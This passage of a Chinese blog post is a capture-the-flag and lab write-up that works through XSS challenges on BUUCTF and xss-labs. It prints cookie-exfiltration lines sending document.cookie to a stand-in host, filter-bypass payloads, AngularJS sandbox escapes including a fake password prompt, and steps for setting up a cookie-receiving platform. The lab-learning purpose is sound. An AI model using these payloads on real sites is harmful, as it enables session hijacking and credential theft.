+<pre><code>&lt;link rel=&quot;prefetch&quot; href=&quot;http://xxx.com/?cookie=xxx&quot;&gt;
+&lt;link rel=&quot;dns-prefetch&quot; href=&quot;http://xxx.com/?cookie=xxx&quot;&gt;
+</code></pre>
+<p>页面跳转</p>
+<p>location.href=”<a target="_blank" rel="noopener" href="http://xxx.com/?cookie=&quot;+escape(document.cookie)">http://xxx.com/?cookie=&quot;+escape(document.cookie)</a></p>
+<h5 id="一些特殊过滤情况"><a href="#一些特殊过滤情况" class="headerlink" title="一些特殊过滤情况"></a>一些特殊过滤情况</h5><p>用<code>/</code>代替空格<br> 用反引号代替括号、双引号<br> 用throw代替括号<br> 用html实体编码<code>:</code>代替冒号<br> 用<a target="_blank" rel="noopener" href="https://www.bugku.com/tools/jsfuck/">jsfuck</a>编码绕过大部分字符过滤</p>
+<h3 id="四、实例"><a href="#四、实例" class="headerlink" title="四、实例"></a>四、实例</h3><p>了解了一下还是要做做实际题目才有所领悟：</p>
+<h5 id="第二章-web进阶-XSS闯关"><a href="#第二章-web进阶-XSS闯关" class="headerlink" title="[第二章 web进阶]XSS闯关"></a>[第二章 web进阶]XSS闯关</h5><p>1.<a target="_blank" rel="noopener" href="http://1f8e1694-e545-49b4-848e-a5aab8b73e35.node4.buuoj.cn:81/level1?username=">http://1f8e1694-e545-49b4-848e-a5aab8b73e35.node4.buuoj.cn:81/level1?username=</a><script>alert('xss')</script></p>
+<p>2.第一关的方法不可用了，看了一眼源码可知：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    	if(location.search == &quot;&quot;)&#123;</span><br><span class="line">    		location.search = &quot;?username=xss&quot;</span><br><span class="line">    	&#125;</span><br><span class="line">    	var username = &#x27;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&#x27;;</span><br><span class="line">    	document.getElementById(&#x27;ccc&#x27;).innerHTML= &quot;Welcome &quot; + escape(username);</span><br><span class="line">    &lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>padload：<a target="_blank" rel="noopener" href="http://1f8e1694-e545-49b4-848e-a5aab8b73e35.node4.buuoj.cn:81/level2?username=&#39;;alert(1);&#39;">http://1f8e1694-e545-49b4-848e-a5aab8b73e35.node4.buuoj.cn:81/level2?username=&#39;;alert(1);&#39;</a></p>
+<p>发现使用了js所编写的一个过滤，username被escape加密。使用’;结束前面的语句，后面加上函数alert(1);使用’1闭合后面的单引号，当然你也可以使用将其注释(//)</p>
+<p>3..<a target="_blank" rel="noopener" href="http://1f8e1694-e545-49b4-848e-a5aab8b73e35.node4.buuoj.cn:81/level3?username=%5C&#39;;alert(1);&#39;%E6%9F%A5%E7%9C%8B%E4%B8%80%E4%B8%8B%E6%BA%90%E4%BB%A3%E7%A0%81%EF%BC%8C%E5%8F%91%E7%8E%B0%E5%8D%95%E5%BC%95%E5%8F%B7(%E2%80%99)%E8%A2%AB%E8%BD%AC%E4%B9%89">http://1f8e1694-e545-49b4-848e-a5aab8b73e35.node4.buuoj.cn:81/level3?username=\&#39;;alert(1);&#39;查看一下源代码，发现单引号(’)被转义</a><script type="text/javascript"><br>        if(location.search == ""){<br>            location.search = "?username=xss"<br>        }<br>        var username = '&#39;;alert(1);'1';<br>        document.getElementById('ccc').innerHTML= "Welcome " + username;<br>    </script></p>
+<p>发现多了一个反斜杠+单引号(’)，那么就相当于’’构成了闭合，那么我们的构造可以为：</p>
+<p>‘’;alert(1);’1</p>
+<p>会被解释为：’\ ‘ ‘;alert(1);’1</p>
+<p>也可以\ ‘;alert(1);’</p>
+<p>解释为‘\ \ ‘;alert(1);’   </p>
+<p>4.出现网页重定向，一直死循环：查看源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">var jumpUrl;</span><br><span class="line">    	if(getQueryVariable(&#x27;jumpUrl&#x27;) == false)&#123;</span><br><span class="line">    		jumpUrl = location.href;</span><br><span class="line">    	&#125;else&#123;</span><br><span class="line">    		jumpUrl = getQueryVariable(&#x27;jumpUrl&#x27;);</span><br><span class="line">    	&#125;</span><br><span class="line">    	setTimeout(jump,1000,time);</span><br><span class="line">    	function jump(time)&#123;</span><br><span class="line">    		if(time == 0)&#123;</span><br><span class="line">    			location.href = jumpUrl;</span><br><span class="line">    		&#125;else&#123;</span><br><span class="line">    			time = time - 1 ;</span><br><span class="line">    			document.getElementById(&#x27;ccc&#x27;).innerHTML= `页面$&#123;time&#125;秒后将会重定向到$&#123;escape(jumpUrl)&#125;`;</span><br><span class="line">    			setTimeout(jump,1000,time);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/8A5D4AFB7DB939FF7269F56F8E8D78F7.jpg" alt="8A5D4AFB7DB939FF7269F56F8E8D78F7"></p>
+<p><img src="/images/DB9B2CF36E0CE7A5A6B1A403E36D245F.jpg" alt="DB9B2CF36E0CE7A5A6B1A403E36D245F"></p>
+<p>这里属于利用js来进行页面跳转，可以使用js伪协议。</p>
+<p><a target="_blank" rel="noopener" href="http://1f8e1694-e545-49b4-848e-a5aab8b73e35.node4.buuoj.cn:81/level4?jumpUrl=javascript:alert(1)">http://1f8e1694-e545-49b4-848e-a5aab8b73e35.node4.buuoj.cn:81/level4?jumpUrl=javascript:alert(1)</a></p>
+<p>5.出现表单看源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">if(getQueryVariable(&#x27;autosubmit&#x27;) !== false)&#123;//如果出错就会执行getQueryVariable函数</span><br><span class="line">    		var autoForm = document.getElementById(&#x27;autoForm&#x27;);</span><br><span class="line">    		autoForm.action = (getQueryVariable(&#x27;action&#x27;) == false//变量action执行getQueryVariable函数) ? location.href : getQueryVariable(&#x27;action&#x27;);</span><br><span class="line">    		autoForm.submit();</span><br><span class="line">    	&#125;else&#123;</span><br><span class="line">    		</span><br><span class="line">    	&#125;</span><br><span class="line">		function getQueryVariable(variable)</span><br><span class="line">		&#123;</span><br><span class="line">		       var query = window.location.search.substring(1);</span><br><span class="line">		       var vars = query.split(&quot;&amp;&quot;);</span><br><span class="line">		       for (var i=0;i&lt;vars.length;i++) &#123;</span><br><span class="line">		               var pair = vars[i].split(&quot;=&quot;);</span><br><span class="line">		               if(pair[0] == variable)&#123;return pair[1];&#125;</span><br><span class="line">		       &#125;</span><br><span class="line">		       return(false);</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
+
+<p>getQueryVariable函数js方法如下，参考菜鸟教程</p>
+<p>function getQueryVariable(variable)<br>{<br>       var query = window.location.search.substring(1);<br>       var vars = query.split(“&amp;”);<br>       for (var i=0;i&lt;vars.length;i++) {<br>               var pair = vars[i].split(“=”);<br>               if(pair[0] == variable){return pair[1];}<br>       }<br>       return(false);</p>
+<p>（2）、url 实例：</p>
+<p>url：<a target="_blank" rel="noopener" href="http://www.runoob.com/index.php?id=1&amp;image=awesome.jpg">http://www.runoob.com/index.php?id=1&amp;image=awesome.jpg</a></p>
+<p>调用 getQueryVariable(“id”) 返回 1。<br>调用 getQueryVariable(“image”) 返回 “awesome.jpg”。</p>
+<p>所以这里我们要绕过这两个函数，让action去执行alert。</p>
+<p><a target="_blank" rel="noopener" href="http://1f8e1694-e545-49b4-848e-a5aab8b73e35.node4.buuoj.cn:81/level5?autosubmit=1&amp;action=javascript:alert(1)">http://1f8e1694-e545-49b4-848e-a5aab8b73e35.node4.buuoj.cn:81/level5?autosubmit=1&amp;action=javascript:alert(1)</a></p>
+<p>6.这一题我是真不会：</p>
+<p>看源码也看不出来什么花样:看了wp说是 <script src="https://cdn.staticfile.org/angular.js/1.4.6/angular.min.js"></script>有一些特殊，</p>
+<p>打开是这样的，看的人头<img src="/images/017DD014.png" alt="img">：<img src="/images/4.16.3.png" alt="4.16.3"></p>
+<p>打开是一长串段js编写的代码，也没发现特别的，看着这个URL，就测试了一下，&#123;&#123;7*4}}可以执行。还真是xss模板注入漏洞，百度了一下还真找到了<a target="_blank" rel="noopener" href="https://nosec.org/home/detail/4153.html">AngularJS客户端模板注入（XSS）|NOSEC安全讯息平台 - 白帽汇安全研究院</a></p>
+<p>文章里是这样描述的：假设你在一个站点上测试XSS，你可以这样做：</p>
+<p><img src="/images/33-16501043323481.png" alt="33.png"></p>
+<p>你可以发现，并没有弹出警告框，这是因为服务器在解析输入之前进行了编码，具体代码如下所示。</p>
+<?php  
+
+  // GET parameter ?q= mit sicherem escaping 
+
+   $q = $_GET['q'];    
+
+echo htmlspecialchars($q,ENT_QUOTES);
+
+ ?>
+
+<p>这（编码）是一种非常流行的防御XSS的方法，对于大多数应用来说已经足够了，但是Angular不同。在Angular中，<strong>我们可以使用不需要使用特殊字符的表达式，这不会受到<code>htmlspecialchars</code>函数的影响</strong>，如下所示：</p>
+<p>如上图所示，我使用了表达式<code>&amp;#123;&amp;#123;1+1&#125;&#125;</code>，它的值是“2”。而这就表明应用很容易受到客户端模板注入的影响。</p>
+<p>仅仅让目标应用将两个数字相加并不那么令人兴奋，但是如果我们可以注入javascript代码呢？现在我们知道<strong>不能简单地插入一个<code>alert(1)</code>函数，因为该函数并没有在作用域对象中定义</strong>。</p>
+<p><strong>默认</strong>情况下，<strong>作用域对象包含另一个名为“构造器”的对象，该对象包含一个也被称为“构造器”的函数。此函数可用于动态生成和执行代码</strong>。而这正是我们执行XSS的payload所需要的，如下图所示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;constructor.constructor(&#x27;alert(1)&#x27;)()&amp;#125;&amp;#125;</span><br></pre></td></tr></table></figure>
+
+<p>请注意<strong>这个payload不包含任何特殊字符。因此编码函数无法对此进行防御（编码也是大多数XSS的防御手段）。</strong></p>
+<p><img src="/images/66-16501045776973.png" alt="66.png"></p>
+<p><img src="/images/77.png" alt="77.png"></p>
+<p>正如你在上面看到的，我们的恶意Angular表达式被注入到页面中，导致应用程序动态地生成和执行我们的payload。</p>
+<p>为了<strong>防御这种类型的攻击，Angular 1.2-1.5版本包含了一个沙箱。但在1.6版以上版本中被删除了，因为沙箱没有提供真正的安全性，存在很多绕过。</strong>如果你所测试的应用的<strong>Angular版本在1.2 - 1.5之间，那么就需要查找对应该版本的沙箱绕过，这样才能使XSS有效执行。</strong></p>
+<h6 id="结论"><a href="#结论" class="headerlink" title="结论"></a><strong>结论</strong></h6><p>新技术往往会带来新漏洞。任何接受用户<strong>输入的客户端模板框架都可能受到客户端模板注入的攻击</strong>。由于Angular使用了“表达式”，所以我们可以借此绕过传统的XSS防护。大多数开发人员严重依赖过去的安全防护方法，忽视了新技术可能带来的新风险。</p>
+<hr>
+<p>angular是一个xss模板注入的模型,所以这题要结合ssti的漏洞。</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u011721501/article/details/51506364">(56条消息) Angular JS模板注入漏洞分析_隐形人真忙的博客-CSDN博客_angular漏洞</a></p>
+<p>观察模板表达式{undefined{1+1}}的解析过程：</p>
+<p>在angular JS 1.4.6版本的13275行下断点，其中fn为表达式解析后的JS函数对象，fnString为解析后的代码，如{undefined{1+1}}解析为JS代码后为：</p>
+<p>“use strict”;<br>var fn = function(s, l, a, i) {<br>    return plus(1, 1);<br>};<br>return fn;<br>可以看到fn是个函数对象，利用plus方法获取1+1的结果并返回，提交模板{undefined{1+1}}，angular内部就执行这个fn函数对象。</p>
+<h6 id="利用constructor尝试绕过"><a href="#利用constructor尝试绕过" class="headerlink" title="利用constructor尝试绕过"></a>利用constructor尝试绕过</h6><p>提交{undefined{constructor.constructor(“alert(1)”)()&#125;&#125;</p>
+<p>ensureSafeObject函数，参数两个,一个是scope一个是模板的表达式，这里是{undefined{constructor.constructor(“alert(1)”)()&#125;&#125;.</p>
+<h6 id="成功的payload原理分析"><a href="#成功的payload原理分析" class="headerlink" title="成功的payload原理分析"></a>成功的payload原理分析</h6><h6 id="1-4版本成功执行的payload："><a href="#1-4版本成功执行的payload：" class="headerlink" title="1.4版本成功执行的payload："></a><strong>1.4</strong>版本成功执行的payload：</h6><p>&#123;&#123;’a’.constructor.prototype.charAt = [].join;$eval(‘x=1} &#125;&#125;;alert(1)//‘);}}</p>
+<h6 id="1-5-5版本中的状况"><a href="#1-5-5版本中的状况" class="headerlink" title="1.5.5版本中的状况"></a><strong>1.5.5</strong>版本中的状况</h6><p>这里限制了对构造函数进行赋值，也就是之前在1.4版本可以使用的：</p>
+<p>&#123;&#123;’a’.constructor.prototype.charAt=[].join;$eval(‘x=1} &#125;&#125;;alert(1)//‘);}}</p>
+<h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p>遇到模板注入ssti的题目一定要抓住客户端模板框架，然后上网去搜对应的注入绕过padload。</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4638">AngularJS Sandbox Bypasses - 先知社区 (aliyun.com)</a></p>
+<p>要求输入密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#123;&amp;#123;&#x27;a&#x27;.constructor.prototype.charAt=[].join;$eval(&#x27;x=1&#125; &#125; &#125;;prompt(&quot;Please enter your password:&quot;)//&#x27;);&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个方法，就是确认了存在xss模板注入以后，我们对Angular(版本号v1.4.0-v1.4.9)沙箱逃逸</p>
+<p>padload：</p>
+<p>&#123;&#123;’a’.constructor.prototype.charAt=[].join;$eval(‘x=1} } };alert(1)//‘);}}</p>
+<h5 id="BUU-XSS-COURSE-1"><a href="#BUU-XSS-COURSE-1" class="headerlink" title="BUU XSS COURSE 1"></a>BUU XSS COURSE 1</h5><p>这里主要使用来获取cookie的功能。</p>
+<p>这个页面是留言板,很有可能是属于储存型xss类型的：</p>
+<img scr="javascript.:alert('xss');">
+
+<p>可以发现这里存在一个存储型XSS漏洞</p>
+<p>先搭建一个个人的xss平台，可以用蓝莲花也可以用xssplatform，cookie接收平台现在比较好的平台是<code>xss-platform</code>，适合多人使用。这里<code>BlueLotus_XSSReceiver</code>，这个平台的优点就是足够小，不需要数据库。缺点就是一般只适合一个人使用。而且发现只能获取cookie信息，无法回显相关更多的网页信息。</p>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/read/cv12079268/">搭建个人XSS平台 - 哔哩哔哩 (bilibili.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/csdnmmd/article/details/120863953">(56条消息) 打Cookie小工具_BlueLotus_XSSReceiver_乌鸦安全的博客-CSDN博客</a></p>
+<p>当私有网络内的主机要与位于公网上的主机进行通讯时必须经过<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2&spm=1001.2101.3001.7020">地址转换</a>，将其私有地址转换为合法公网地址才能对外访问。这里我们用花生壳：</p>
+<p> <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F&spm=1001.2101.3001.7020">内网穿透</a>原理是映射端口, 能让外网的电脑找到处于内网的电脑; 简单说就是局域网的服务外网访问不到,通过内网穿透技术来实现外网到内网的端口映射, 进行实现外网访问内网服务.</p>
+<p>一下这篇博客是我看到的公网ip与内网穿透功能的差别：</p>
+<p><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/404693104/answer/2222425851">https://www.zhihu.com/question/404693104/answer/2222425851</a></p>
+<p>在吐槽里面注入padload。在个人的网址上即可看到cookie值，在相应的网页里面修改cookie即可。</p>
+<h5 id="XSS-Lab"><a href="#XSS-Lab" class="headerlink" title="XSS-Lab"></a>XSS-Lab</h5><p><a target="_blank" rel="noopener" href="https://www.csdn.net/tags/MtTaIgxsNDQzMzUtYmxvZwO0O0OO0O0O.html">(56条消息) xss语句 - CSDN</a></p>
+<h6 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h6><p>看了源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href=&quot;level2.php?keyword=test&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>name=<script>alert("aaaa")</script></p>
+<h6 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h6><p>构造：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=&quot;test&quot;&gt;&lt;script&gt;alert(123)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 align=center&gt;没有找到和test相关的结果.&lt;/h2&gt;&lt;center&gt;</span><br><span class="line">&lt;form action=level2.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;test&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</span><br></pre></td></tr></table></figure>
+
+<p>注入的点是在value中，但此时我们如果在value中输入script语句的话，会被当成是value的值，所以我们要先用”&gt;来过滤value的值，在通过script标签进行alert的输入，因此payload也就很简单了，”&gt;<script>alert("ysys");</script>，通过这种方式注入就可以正确进入下一关了。</p>
+<h6 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h6><p>注入后发现：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=level3.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&#x27;&#x27;&amp;gt;&amp;lt;script&amp;gt;alert(&amp;quot;)&amp;lt;/script&amp;gt;&#x27;&gt;</span><br><span class="line">&lt;</span><br></pre></td></tr></table></figure>
+
+<p>绕过html实体编码：</p>
+<p>我们输入的&lt;和&gt;被转义</p>
+<p>实体编码htmlspecialchars,htmlspecialchars() 函数可以把一些预定义的字符转换为 HTML 实体。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp; （和号）成为 &amp;amp;</span><br><span class="line">&quot; （双引号）成为 &amp;quot;</span><br><span class="line">&#x27; （单引号）成为 &amp;#039</span><br><span class="line">&lt; （小于）成为 &amp;lt;</span><br><span class="line">&gt; （大于）成为 &amp;gt;</span><br></pre></td></tr></table></figure>
+
+<p>同时：ENT_COMPAT 默认 仅编码双引号</p>
+<p>ENT_QUOTES 编码双引号和单引号</p>
+<p>ENT_NOQUOTES 不编码任何引号</p>
+<p>所以要绕过&gt;&lt;可以用的方法是用事件的方式：</p>
+<p>onmouseover函数在鼠标指针移动到元素上被触发（这里是搜索框），onmouseover = ‘javascript:alert(1)’，在鼠标指针移动到元素会弹窗alert(1)。</p>
+<p>keyword=’ onmouseover =’javascript:alert(1)&amp;submit=搜索</p>
+<p>还有要注意这里有两个键值对，所以我们要注入的点有两个。</p>
+<h6 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h6><p>一开始我们应该想的思路是从没有过滤开始，即level2 的padload，然后发现不行，再来判断过滤的类型。</p>
+<p>一样的，不过闭合方式换成了双引号，我们要加以修改一下3的就可以。</p>
+<h6 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h6><p>这里对script和on事件都有进行过滤，然后我们试着用大小写绕过，因为HTML对于大小写不敏感，但是这里还是不行。</p>
+<p>那除了script和on事件我们还有什么方法呢，这时候想起昨天刚刚看到的伪协议。</p>
+<a >
+
+<p>作用是于对<code>&lt;script&gt;</code>标签, <code>(</code> , <code>)</code> , <code>&#39;</code> , <code>&quot;</code>,<code>票号(写不出来)</code> 进行过滤绕过;</p>
+<p>一开始在做的时候不太明白原理：herf是一个链接</p>
+<p>在页面中超链接可以是一个字，一个词，或者一段话，也可以是一幅图像，可以点击这些内容来跳转到新的页面或者当前页面中的某个部分，在HTML中通常使用a标签创建超链接。<br>a标签的使用非常简单，a标签中加入属性herf=“url”，把url为需要跳转的地址,例如点击文字“百度一下”跳转到百度首页。</p>
+<p><a target="_blank" rel="noopener" href="http://www.baidu.com"></a><br>说到<strong>herf</strong>属性，下面给大家介绍一下a标签中herf属性的两种用法。</p>
+<p>herf用法<br>1.跳转到目标页面<br>上述说到跳转到百度首页，在没有网的情况下也可以跳转到本地资源的页面。</p>
+<p><a href="index3.html">跳转到本地页面</a></p>
+<p><strong>2.锚链接</strong></p>
+<p>第一种是在本页面中实现点击跳转到页面任意一个位置</p>
+<p>所以这题在打完padload后要进行点击图片才可以进行。</p>
+<p>padload=” &gt;&lt;a href=”javascript:alert(1)</p>
+<h6 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h6><p>herf被过滤了，试试大小写script，就绕过去了keyword=”&gt;<SCRIPT>alert(0)</script>&amp;submit=搜索</p>
+<h6 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h6><p>这里script被替换为空，伪协议也不能用了。</p>
+<p>双写绕过：keyword=test” oonnmouseover=”javascripscriptt:alert(1)&amp;submit=%E6%90%9C%E7%B4%A2</p>
+<p>onmouseover函数在鼠标指针移动到元素上被触发（这里是搜索框）</p>
+<h6 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h6><p>&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#48;&#41;</p>
+<p>进行了HTML实体编码，并且有过滤on事件和script，所以我们可以先编码，然后看看可不可以用a超链接。将javascript代码使用html编码，就可以避免payload中的script被过滤了。padload要在表格框里注入，或者hackbar&amp;submit=友情链接。</p>
+<h6 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h6><p>这题看了wp：</p>
+<p>提交的参数值插入到了标签的value属性值中</p>
+<p>但是在<a>标签的href属性中却并没有出现该参数值，</p>
+<p>而是显示的 “您的链接不合法？有没有！”这样的字符串。</p>
+<p>猜测这里<strong>可能对url地址做了匹配。</strong></p>
+<p>只有包含正常的url地址才能添加到href属性值中</p>
+<p>构造一个有正常url地址的恶意代码：</p>
+<p>我们就可以在javascript的语句后面加上一个http://，但是这个语句一定要被注释掉，确保它不会影响我们的js语句，js中的注释是//，哦，对了，既然和上关一样的话，我们还是要用编码的方式来插入我们的语句</p>
+<p>直接在padload里输入：</p>
+<p>&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;//http://</p>
+<p>在服务器端看到这关的源文件代码：</p>
+<p><img src="../images/level9.png" alt="level9"></p>
+<p>![8](../images/8-16505345605641.png</p>
+<h6 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h6><p>没有输入框，网页代码里发现表单里面有三个input标签被隐藏了，那么根据他们的name构造传值，让它们的type改变为text，谁出来了谁就能利用。</p>
+<p>我们尝试在get中输入这三个参数，测试发现t_sort这个参数会把输入的值加入到value中，那么这个就是一个突破点，我们尝试输入”&gt;，结果发现提交的参数会把&lt;&gt;过滤掉，那我们就使用能在尖括号内使用的函数。点击触动，<code>&quot; onclick=javascript:alert(1); type=&quot;text&quot;</code>，后面的type是为了把type=hidden这个参数给取消掉，因为在html中，<strong>如果在一个标签里面有两个参数的话，后面的参数不会被执行，把这个标签给显示出来</strong>，因为我们要点击它。当我们输入这个之后，页面出现一个输入框，点击它，成功过关。</p>
+<p>有关一些on事件 ：</p>
+<p>这一关还可以用<strong>onmousemove</strong>（在鼠标指针移到指定的元素后执行Javascript代码），<strong>onmouseover</strong>，onfocus（当 input 输入框获取焦点时执行一段 Javascript代码）等这些都是可以的。</p>
+<p><strong>onfocus</strong>网页的上的一个输入框，当使用鼠标点击该输入框使输入框被选中可以输入内容的时候就是该输入框获得焦点的时候，此时输入框就会触发onFocus事件。</p>
+<p><em><strong>onclick</strong></em> 事件会在元素被点击时发生</p>
+<p>padload：keyword=a&amp;t_sort=” onclick=javascript:alert(1); type=”text”</p>
+<h6 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h6><p>被隐藏的标签，叫做t_ref ，当我们从上一关进来之后，发现t_ref的value是上一关的网址，所以我们猜测这个t_ref是获取网页的referer。</p>
+<p>其字段名为ref，联想到http报文中的referer字段。再刷新一次，发现果然，是会根据服务器接收的值动态变化的。</p>
+<p>查看源代码，发现t_sort这儿的值也被htmlspecialchars()了，在这里，我们要从referer下手，可以添加referer，把referer的语句写为：<code>&quot; onclick=javascript:alert(1); type=&quot;text</code>这时候的type也是来取消这个隐藏。发现成功绕过。</p>
+<p>这里要用bp,hackbar我试不上去。</p>
+<h6 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h6><p>是User Agent参数段，其他没什么差别</p>
+<h6 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h6><p>是t_cook” ，猜测是cookie字段，Cookie: user=” onclick=”javascript:alert(1)” type=”text</p>
+<h6 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h6><p>这题在上面的trick里面有提到，还是利用javascript伪协议来构建。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">通过js代码注入</span><br><span class="line">向网站文本框中填写js脚本，如&lt;script&gt;alert(&quot;aa&quot;)&lt;/script&gt;,那么在前端查询时，会弹出这个aa提示，</span><br><span class="line">如果在alert(&quot;aa&quot;);为加一层死循环，那么查询此数据时，会死循环弹出&quot;aa&quot;,导致页面无法再使用</span><br><span class="line">2.通过&lt;img&gt;标签注入</span><br><span class="line">向网站文本框中填写&lt;img&gt;标签：&lt;img src=&quot;图片地址&quot; /&gt;,那么在前端查询时，会展示这个图片文件</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">通过&lt;iframe&gt;标签注入</span><br><span class="line">向网站添加信息文本中填写&lt;iframe&gt;标签：&lt;iframe src=&quot;链接地址&quot; &gt;&lt;/iframe&gt;,那么在前端查询时，会展示这个链接地址的小网页在网站中</span><br></pre></td></tr></table></figure>
+
+<h6 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h6><p>第十五关也做不了，所以我们了解一下考点</p>
+<p>新属性，<code>ng-include</code>，指令一般用于包含外部HTML文件，ng-include属性的值可以是一个表达式，返回一个文件名，但是默认情况下，包含的文件需要包含在同一域名下，也就是要调用同一域名下的其他网页</p>
+<p> padload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.235.130/xss-labs-master/level15.php?src=&#x27;level1.php?name=&lt;img src=1 onerror=alert(/bmfx/)&gt;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p> 给语句使本页面包含了同域名<strong>level1.php</strong>返回的HTML文件，并将name的字段传入，虽然尖括号被编码了，但是level1的name处是没有任何括号之内的东西的，所以可行。</p>
+<h6 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h6><p>/、script、空格都被转掉了，所以我们就构造单标签img，url编码%0a，onerror事件，在装载文档或图像的过程中如果发生了错误，就会触发<strong>onerror</strong>事件</p>
+<p>padload=&lt;img%0asrc=1%0aonerror=alert(1)&gt;</p>
+<h6 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h6><p>这里可以这一关有两个参数，这两个参数会拼接到一起，最后访问到swf文件上了，我们可以给第一个参数前面加一个空格，这样参数一就会变成一个参数，但是我们又看不到这个标签，所以我们不能聚焦，点击，所以只能使用鼠标移动这个事件，所以构造的语句是：<code>arg01=1&amp;arg02=2%20onmouseover=javascript:alert(1)</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arg01=1&amp;arg02=2%20onmouseover=javascript:alert(1)</span><br></pre></td></tr></table></figure>
+
+<p>两个变量使用<code>=</code>符号拼接的形式被加入到<embed>标签中，该标签用于一些插件如flash等的插入，那这就是一个突破口</p>
